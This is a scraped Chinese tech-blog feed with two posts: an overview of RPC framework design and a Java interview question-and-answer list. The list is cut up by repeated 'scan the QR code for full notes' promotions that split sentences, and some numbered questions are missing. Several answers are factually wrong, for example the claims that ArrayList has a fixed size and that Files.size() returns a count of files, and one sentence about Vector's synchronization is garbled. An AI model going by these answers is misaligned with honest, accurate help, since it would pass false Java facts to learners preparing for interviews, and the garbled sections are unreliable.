p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>想要学好微服务，RPC框架肯定是一个绕不开的话题。在我看来，任何框架都是为了后续开发者的便利，帮我们封装好可重复利用的工具或者某些固定流程，RPC框架也不例外。RPC框架最重要的作用就是帮我们将多个服务连接起来，即实现<strong>远程调用</strong>，让我们能<strong>像调用本地方法一样调用别的服务里的方法</strong>。</p>
<p>简而言之，RPC框架就是将复杂的网络通信、序列化等操作封装起来，这是最重要的。当然，一个完整的生产级RPC框架还融合了更多模块来保证其健壮性和高性能，比如服务注册与发现、重试机制、容错（熔断）机制、基于TCP的自定义协议、负载均衡等。这篇文章为了“浅出”，我们先搭建一个简易RPC框架的骨架，讲讲各个核心模块的作用，暂不深入挖掘具体实现。</p>
<h3 data-id="heading-0">一、 网络通信</h3>
<p>首先，我们想要调用另一个服务的方法，必然要通过网络进行通信。最常见的就是消费者发送一个请求，提供者处理后再返回结果。那么，这个请求里需要包含哪些信息，提供者才能准确地找到并执行对应的方法呢？</p>
<p><strong>核心信息包括：</strong></p>
<ol>
<li><strong>接口全限定名</strong>：比如 <code>com.example.UserService</code>。告诉提供者“我要调用哪个服务接口”。</li>
<li><strong>方法名</strong>：比如 <code>getUserById</code>。告诉提供者“我要调用这个接口下的哪个方法”。</li>
<li><strong>参数类型</strong>：比如 <code>(java.lang.Long)</code>。方法可能会重载，只有方法名不够，还需要参数类型才能唯一确定一个方法。</li>
<li><strong>参数值</strong>：比如 <code>123L</code>。执行方法所需要的具体数据。</li>
<li><strong>版本号</strong>（可选）：如果接口有多个不兼容的版本，需要版本号来做区分。</li>
</ol>
<p><strong>通信协议的选择：</strong></p>
<ul>
<li><strong>HTTP</strong>：优点在于简单、通用，任何语言都支持。但对于高性能的RPC内部调用来说，HTTP协议的头部信息（Header）较大，效率不是最高。</li>
<li><strong>TCP + 自定义协议</strong>：高性能RPC框架（如Dubbo、gRPC）的常见选择。可以设计非常紧凑的二进制协议，减少不必要的网络开销，性能极高。这才是RPC框架网络层的精髓。</li>
</ul>
<p><strong>简单来说，网络通信模块就是RPC的远程调用的“核心”，负责将请求从客户端运送到服务端，再把结果运送回来。</strong></p>
<h3 data-id="heading-1">二、 代理对象</h3>
<p>既然我们的目标是“像调用本地方法一样”，那么我们在客户端代码里就不应该看到任何网络操作的痕迹（比如<code>HttpClient</code>）。如何实现这一点？答案就是：<strong>动态代理</strong>。</p>
<p>代理对象是RPC框架的“魔法师”，它对外伪装成真正的服务接口。当你调用 <code>userService.getUserById(123)</code>时，你实际上调用的是代理对象的方法。</p>
<p>这个代理对象在背后默默地做了以下事情：</p>
<ol>
<li><strong>拦截调用</strong>：它拦截了你对所有接口方法的调用。</li>
<li><strong>信息封装</strong>：它将你调用的方法名、参数类型、参数值等信息，按照和服务器约定好的格式封装起来。</li>
<li><strong>委托通信模块</strong>：它将封装好的数据交给<strong>网络通信</strong>模块发送给服务端。</li>
<li><strong>等待并返回结果</strong>：它同步等待网络返回，拿到结果数据后，再原样返回给你。</li>
</ol>
<p>这样，作为开发者的你，只需要关心接口的定义和调用，完全感知不到背后的网络请求。代理模式是实现RPC透明性的关键技术。</p>
<h3 data-id="heading-2">三、 注册中心</h3>
<p>在简单的RPC调用中，服务提供者的IP和端口可以直接写在消费者的配置里。但在微服务架构中，服务实例众多且会动态变化（扩缩容、宕机），这种“硬编码”的方式就无法工作了。这时就需要<strong>注册中心</strong>。</p>
<p>注册中心就像是微服务世界的 <strong>“服务列表”</strong>，存储了各种服务状态以及信息，让Consummer知道给哪个ip中的哪个端口发送消息。</p>
<ul>
<li><strong>服务注册</strong>：当一个服务提供者启动时，它会将自己的服务名（如<code>UserService</code>）和网络地址（如<code>192.168.1.10:8080</code>）注册到注册中心。</li>
<li><strong>服务发现</strong>：当一个服务消费者需要调用<code>UserService</code>时，它不再需要硬编码地址，而是去注册中心查询所有可用的<code>UserService</code>实例的地址列表。</li>
<li><strong>健康检查</strong>：注册中心会定期检查服务提供者的健康状态（心跳机制），如果发现某个实例宕机，就将其从地址列表中移除，确保消费者不会调用到已失效的节点。</li>
</ul>
<p><strong>常见的注册中心有：Nacos、Zookeeper、Consul、Eureka等。</strong> ​ 注册中心的存在是实现服务治理和高可用的基石。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/408592a6ecd54b9eb6d23ef53a55e2b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWFVONEo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764473391&amp;x-signature=FdpfkbCpv1Un%2BKw7FKv8rtmVHDk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">四、 优化与扩展</h3>
<p>一个基础的RPC框架有了以上三个部分就可以运行了。但要成为一个成熟的生产级框架，还需要很多可优化和扩展的点。</p>
<p><strong>1. 多种序列化方式</strong></p>
<p>序列化是将对象转换为字节流的过程，反序列化则是其逆过程。不同的序列化协议在速度、体积、可读性、跨语言支持上各有优劣。提供多种选择（如JSON、Hessian、Protobuf、Kryo）可以让用户根据具体场景（如高性能、跨语言）进行权衡。</p>
<p><strong>2. 多种负载均衡策略</strong></p>
<p>当同一个服务有多个提供者时，消费者需要决定调用哪一个。这就是负载均衡。常见的策略有：</p>
<ul>
<li><strong>随机</strong>：从可用列表中随机选择一个。</li>
<li><strong>轮询</strong>：依次调用每一个提供者。</li>
<li><strong>最少活跃调用数</strong>：优先调用当前处理请求最少的服务器。</li>
<li><strong>一致性哈希</strong>：相同参数的请求总是发到同一提供者，适用于需要缓存的场景。</li>
</ul>
<p><strong>3. 多种网络通信协议</strong></p>
<p>除了支持基本的TCP自定义协议，还可以扩展支持HTTP/2、gRPC等协议，以适应不同的网络环境或生态集成。</p>
<p><strong>4. SPI机制</strong></p>
<p>SPI（Service Provider Interface）是一种服务发现机制。
它将接口的实现类配置在文件中，程序在运行时读取文件来加载具体的实现。不同于SpringBoot里将配置信息写在application中，可以实现某些配置信息与业务代码分离。SPI的作用是实现动态加载，其结合application就可以完美实现上述多种协议、多种序列化机制的动态选择。
<strong>利用SPI，框架的所有核心组件（如序列化、负载均衡、注册中心）都可以做成可插拔的</strong>，极大地提升了框架的扩展性。这是Dubbo等优秀框架设计的精髓。</p>
<p><strong>5. 重试机制与容错机制</strong></p>
<p>网络是不可靠的，调用可能会失败。框架需要提供容错策略。</p>
<ul>
<li>
<p><strong>重试机制</strong>：调用失败后自动重试，通常需要配合幂等设计。</p>
</li>
<li>
<p><strong>容错策略</strong>：</p>
<ul>
<li><strong>Failover</strong>（故障转移）：失败后自动重试其他服务器。</li>
<li><strong>Failfast</strong>（快速失败）：失败后立即报错，用于非幂等操作。</li>
<li><strong>Failsafe</strong>（安全失败）：失败后忽略，仅记录日志。</li>
<li><strong>熔断器机制</strong>：当故障达到一定阈值，自动“熔断”，防止故障雪崩，并在一段时间后尝试恢复。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">总结</h3>
<p>让我们再串一下整个流程：消费者通过<strong>代理对象</strong>调用接口方法 -&gt; 代理对象将调用信息<strong>序列化</strong>​ -&gt; 通过<strong>网络通信</strong>模块发送请求 -&gt; 请求首先被发往<strong>注册中心</strong>进行服务发现，获取真实的服务地址 -&gt; 请求被发送到服务提供者 -&gt; 提供者<strong>反序列化</strong>请求，通过反射执行本地方法 -&gt; 将结果按原路返回。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java面试题总结（含答案）]]></title>    <link>https://juejin.cn/post/7575112613777834018</link>    <guid>https://juejin.cn/post/7575112613777834018</guid>    <pubDate>2025-11-23T06:02:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613777834018" data-draft-id="7575162322239815680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java面试题总结（含答案）"/> <meta itemprop="keywords" content="后端,面试,Java"/> <meta itemprop="datePublished" content="2025-11-23T06:02:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java水解"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java面试题总结（含答案）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java水解
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:02:45.000Z" title="Sun Nov 23 2025 06:02:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h6 data-id="heading-0">发现网上很多Java面试题都没有答案，所以花了很长时间搜集整理出来了这套Java面试题大全~ <strong>这套互联网 Java 工程师面试题包括了：MyBatis、ZK、Dubbo、EL、Redis、MySQL、并发编程、Java面试、Spring、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题</strong>  <strong>一、Java 基础</strong> <strong>1. JDK 和 JRE 有什么区别？</strong>  </h6>
<ul>
<li>JDK：Java Development Kit 的简称，java 开发工具包，提供了 java 的开发环境和运行环境。</li>
<li>JRE：Java Runtime Environment 的简称，java 运行环境，为 java 的运行提供了所需环境。</li>
</ul>
<p>具体来说 JDK 其实包含了 JRE，同时还包含了[编译 java] 源码的编译器 [javac]，还包含了很多 java 程序调试和分析的工具。简单来说：如果你需要运行 java 程序，只需安装 JRE 就可以了，如果你需要编写 java 程序，需要安装 JDK。<br/>
<strong>2. == 和 equals 的区别是什么？</strong><br/>
== 对于基本类型来说是值比较，对于引用类型来说是比较的是引用；而 equals 默认情况下是引用比较，只是很多类重新了 equals 方法，比如 String、Integer 等把它变成了值比较，所以一般情况下 equals 比较的是值是否相等。<br/>
<strong>3. 两个对象的 hashCode()相同，则 equals()也一定为 true，对吗？</strong><br/>
不对，两个对象的 hashCode()相同，equals()不一定 true。<br/>
代码解读：很显然“通话”和“重地”的 hashCode() 相同，然而 equals() 则为 false，因为在[散列表]中，hashCode()相等即两个键值对的哈希值相等，然而哈希值相等，并不一定能得出键值对相等。<br/>
<strong>4. final 在 java 中有什么作用？</strong><br/>
</p>
<ul>
<li>final 修饰的类叫最终类，该类不能被继承。</li>
<li>final 修饰的方法不能被重写。</li>
<li>final 修饰的变量叫常量，常量必须初始化，初始化之后值就不能被修改。</li>
</ul>
<p><strong>5. java 中的 Math.round(-1.5) 等于多少？</strong><br/>
等于 -1，因为在数轴上取值时，中间值（0.5）向右取整，所以正 0.5 是往上取整，负 0.5 是直接舍弃。<br/>
<strong>6. String 属于基础的数据类型吗？</strong><br/>
String 不属于基础类型，基础类型有 8 种：byte、boolean、char、short、int、float、long、double，而 String 属于对象。<br/>
<strong>7. java 中操作字符串都有哪些类？它们之间有什么区别？</strong><br/>
操作字符串的类有：String、StringBuffer、StringBuilder。<br/>
String 和 StringBuffer、StringBuilder 的区别在于 String 声明的是不可变的对象，每次操作都会生成新的 String 对象，然后将指针指向新的 String</p>
<blockquote>
<blockquote>
<p><strong>篇幅限制下面就只能给大家展示小册部分内容了。整理了一份核心面试笔记包括了：Java面试、Spring、JVM、MyBatis、Redis、MySQL、并发编程、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题</strong></p>
<blockquote>
</blockquote>
<p><strong>需要全套面试笔记及答案【扫一扫】</strong>                    即可免费获取**</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1134fb8ab14da08b3b633d1585cba9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Vh90fwbFeCv54lFdBGJtsGkM0X8%3D" alt="8fbf1ef8b61e2dbbb33b7690a41d12e.png" loading="lazy"/></p>
</blockquote>
<p>对象，而 StringBuffer、StringBuilder 可以在原有对象的基础上进行操作，所以在经常改变字符串内容的情况下最好不要使用 String。<br/>
StringBuffer 和 StringBuilder 最大的区别在于，StringBuffer 是线程安全的，而 StringBuilder 是非线程安全的，但 StringBuilder 的性能却高于 StringBuffer，所以在单线程环境下推荐使用 StringBuilder，多线程环境下推荐使用 StringBuffer。<br/>
<strong>8. String str="i"与 String str=new String("i")一样吗？</strong><br/>
不一样，因为内存的分配方式不一样。String str="i"的方式，java 虚拟机会将其分配到[常量池]中；而 String str=new String("i") 则会被分到堆内存中。<br/>
<strong>9. 如何将字符串反转？</strong><br/>
使用 StringBuilder 或者 stringBuffer 的 reverse() 方法。<br/>
<strong>10. String 类的常用方法都有那些？</strong></p>
<ul>
<li>indexOf()：返回指定字符的索引。</li>
<li>charAt()：返回指定索引处的字符。</li>
<li>replace()：字符串替换。</li>
<li>trim()：去除字符串两端空白。</li>
<li>split()：分割字符串，返回一个分割后的字符串数组。</li>
<li>getBytes()：返回字符串的 byte 类型数组。</li>
<li>length()：返回字符串长度。</li>
<li>toLowerCase()：将字符串转成小写字母。</li>
<li>toUpperCase()：将字符串转成大写字符。</li>
<li>substring()：截取字符串。</li>
<li>equals()：字符串比较。</li>
</ul>
<p><strong>11. 抽象类必须要有抽象方法吗？</strong><br/>
不需要，抽象类不一定非要有抽象方法。<br/>
</p>
<ul>
<li>普通类不能包含抽象方法，抽象类可以包含抽象方法。</li>
<li>抽象类不能直接实例化，普通类可以直接实例化。</li>
</ul>
<p><strong>13. 抽象类能使用 final 修饰吗？</strong><br/>
不能，定义抽象类就是让其他类继承的，如果定义为 final 该类就不能被继承，这样彼此就会产生矛盾，所以 final 不能修饰抽象类<br/>
<strong>14. 接口和抽象类有什么区别？</strong><br/>
</p>
<ul>
<li>实现：抽象类的子类使用 extends 来继承；接口必须使用 implements 来实现接口。</li>
<li>构造函数：抽象类可以有构造函数；接口不能有。</li>
<li>main 方法：抽象类可以有 main 方法，并且我们能运行它；接口不能有 main 方法。</li>
<li>实现数量：类可以实现很多个接口；但是只能继承一个抽象类。</li>
<li>访问修饰符：接口中的方法默认使用 public 修饰；抽象类中的方法可以是任意访问修饰符。</li>
</ul>
<p><strong>15. java 中 IO 流分为几种？</strong><br/>
按功能来分：输入流（input）、输出流（output）。<br/>
按类型来分：字节流和字符流。<br/>
字节流和字符流的区别是：字节流按 8 位传输以字节为单位输入输出数据，字符流按 16 位传输以字符为单位输入输出数据。<br/>
<strong>16. BIO、NIO、AIO 有什么区别？</strong><br/>
</p>
<ul>
<li>BIO：Block IO 同步阻塞式 IO，就是我们平常使用的传统 IO，它的特点是模式简单使用方便，并发处理能力低。</li>
<li>NIO：New IO 同步非阻塞 IO，是传统 IO 的升级，客户端和服务器端通过 Channel（通道）通讯，实现了多路复用。</li>
<li>AIO：Asynchronous IO 是 NIO 的升级，也叫 NIO2，实现了异步非堵塞 IO ，异步 IO 的操作基于事件和回调机制。</li>
</ul>
<p><strong>17. Files的常用方法都有哪些？</strong><br/>
</p>
<ul>
<li>
<p>Files.exists()：检测文件路径是否存在。</p>
</li>
<li>
<p>Files.createFile()：创建文件。</p>
</li>
<li>
<p>Files.createDirectory()：创建文件夹。</p>
</li>
<li>
<p>Files.delete()：删除一个文件或目录。</p>
</li>
<li>
<p>Files.copy()：复制文件。</p>
</li>
<li>
<p>Files.move()：移动文件。</p>
</li>
<li>
<p>Files.size()：查看文件个数。</p>
</li>
<li>
<p>Files.read()：读取文件。</p>
</li>
<li>
<p>Files.write()：写入文件。</p>
</li>
</ul>
<p><strong>二、容器</strong><br/>
<strong>18. java 容器都有哪些？</strong><br/>
常用容器的图录：<br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c491f90ead85489da6c3ff49e9a507e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=U5zJhf%2BwK%2BI%2FW7ZLdeEZTE9lyXQ%3D" alt="" loading="lazy"/></p>
<p><strong>19. Collection 和 Collections 有什么区别？</strong><br/>
</p>
<ul>
<li>java.util.Collection 是一个集合接口（集合类的一个顶级接口）。它提供了对集合对象进行基本操作的通用接口方法。Collection接口在Java 类库中有很多具体的实现。Collection接口的意义是为各种具体的集合提供了最大化的统一操作方式，其直接继承接口有List与Set。</li>
<li>Collections则是集合类的一个工具类/帮助类，其中提供了一系列静态方法，用于对集合中元素进行排序、搜索以及线程安全等各种操作。</li>
</ul>
<p><strong>20. List、Set、Map 之间的区别是什么？</strong><br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5264903a4f074b50b673a66693add46f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=tN03Yd6DCz9uHfDexX8seIR4DQs%3D" alt="" loading="lazy"/></p>
<p><strong>21. HashMap 和 Hashtable 有什么区别？</strong><br/>
</p>
<ul>
<li>
<p>hashMap去掉了HashTable 的contains方法，但是加上了containsValue（）和containsKey（）方法。</p>
</li>
<li>
<p>hashTable同步的，而HashMap是非同步的，效</p>
</li>
</ul>
<blockquote>
<blockquote>
<p><strong>篇幅限制下面就只能给大家展示小册部分内容了。整理了一份核心面试笔记包括了：Java面试、Spring、JVM、MyBatis、Redis、MySQL、并发编程、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题</strong></p>
<blockquote>
</blockquote>
<p><strong>需要全套面试笔记及答案【扫一扫】</strong>                    即可免费获取**</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1134fb8ab14da08b3b633d1585cba9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Vh90fwbFeCv54lFdBGJtsGkM0X8%3D" alt="8fbf1ef8b61e2dbbb33b7690a41d12e.png" loading="lazy"/></p>
</blockquote>
<pre><code class="hljs">率上逼hashTable要高。
</code></pre>
<ul>
<li>hashMap允许空键值，而hashTable不允许。</li>
</ul>
<p><strong>22. 如何决定使用 HashMap 还是 TreeMap？</strong><br/>
对于在Map中插入、删除和定位元素这类操作，HashMap是最好的选择。然而，假如你需要对一个有序的key集合进行遍历，TreeMap是更好的选择。基于你的collection的大小，也许向HashMap中添加元素会更快，将map换为TreeMap进行有序key的遍历。<br/>
<strong>23. 说一下 HashMap 的实现原理？</strong><br/>
HashMap概述： HashMap是基于哈希表的Map接口的非同步实现。此实现提供所有可选的映射操作，并允许使用null值和null键。此类不保证映射的顺序，特别是它不保证该顺序恒久不变。<br/>
HashMap的数据结构： 在java编程语言中，最基本的结构就是两种，一个是数组，另外一个是模拟指针（引用），所有的数据结构都可以用这两个基本结构来构造的，HashMap也不例外。HashMap实际上是一个“链表散列”的数据结构，即数组和链表的结合体。<br/>
</p>
<ul>
<li>HashSet底层由HashMap实现</li>
<li>HashSet的值存放于HashMap的key上</li>
<li>HashMap的value统一为PRESENT</li>
</ul>
<p><strong>25. ArrayList 和 LinkedList 的区别是什么？</strong><br/>
最明显的区别是 ArrrayList底层的数据结构是数组，支持随机访问，而 LinkedList 的底层数据结构是双向循环链表，不支持随机访问。使用下标访问一个元素，ArrayList 的时间复杂度是 O(1)，而 LinkedList 是 O(n)。<br/>
<strong>26. 如何实现数组和 List 之间的转换？</strong><br/>
</p>
<ul>
<li>List转换成为数组：调用ArrayList的toArray方法。</li>
<li>数组转换成为List：调用Arrays的asList方法。</li>
</ul>
<p><strong>27. ArrayList 和 Vector 的区别是什么？</strong><br/>
</p>
<ul>
<li>Vector是同步的，而ArrayList不是。然而，如果你寻求在迭代的时候对列表进行改变，你应该使用CopyOnWriteArrayList。</li>
<li>ArrayList比Vector快，它因为有同步，不会过载。</li>
<li>ArrayList更加通用，因为我们可以使用Collections工具类轻易地获取同步列表和只读列表。</li>
</ul>
<p><strong>28. Array 和 ArrayList 有何区别？</strong><br/>
</p>
<ul>
<li>Array可以容纳基本类型和对象，而ArrayList只能容纳对象。</li>
<li>Array是指定大小的，而ArrayList大小是固定的。</li>
<li>Array没有提供ArrayList那么多功能，比如addAll、removeAll和iterator等。</li>
</ul>
<p><strong>29. 在 Queue 中 poll()和 remove()有什么区别？</strong><br/>
poll() 和 remove() 都是从队列中取出一个元素，但是 poll() 在获取元素失败的时候会返回空，但是 remove() 失败的时候会抛出异常。<br/>
<strong>30. 哪些集合类是线程安全的？</strong><br/>
</p>
<ul>
